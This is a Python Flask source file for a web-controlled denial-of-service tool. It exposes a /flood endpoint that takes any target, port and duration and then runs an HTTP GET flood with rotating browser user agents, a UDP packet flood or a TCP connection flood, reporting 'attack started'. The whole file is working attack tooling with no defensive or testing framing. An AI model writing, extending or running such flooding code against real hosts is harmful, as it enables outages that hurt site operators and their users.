from flask import Flask, request, jsonify, render_template
import socket
import asyncio
import aiohttp
import random
import time

app = Flask(__name__)

# List of user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
]

async def http_flood(target, duration, semaphore):
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            async with semaphore:
                try:
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1"
                    }
                    async with session.get(target, headers=headers) as response:
                        print(f"Sent request to {target}, status code: {response.status}")
                except Exception as e:
                    print(f"HTTP Flood Error: {e}")
                    pass

async def udp_flood(target, port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b"AAAAA", (target, port))
            sock.close()
        except Exception as e:
            print(f"UDP Flood Error: {e}")
            pass

async def tcp_flood(target, port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(b"AAAAA")
            sock.close()
        except Exception as e:
            print(f"TCP Flood Error: {e}")
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/flood', methods=['POST'])
def flood():
    data = request.json
    target = data['target']
    port = int(data['port'])
    duration = int(data['duration'])
    attack_type = data['attack_type']

    if attack_type == 'http':
        semaphore = asyncio.Semaphore(1000)  # Limit the number of concurrent requests
        asyncio.run(http_flood(target, duration, semaphore))
    elif attack_type == 'udp':
        asyncio.run(udp_flood(target, port, duration))
    elif attack_type == 'tcp':
        asyncio.run(tcp_flood(target, port, duration))

    return jsonify({"status": "attack started"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
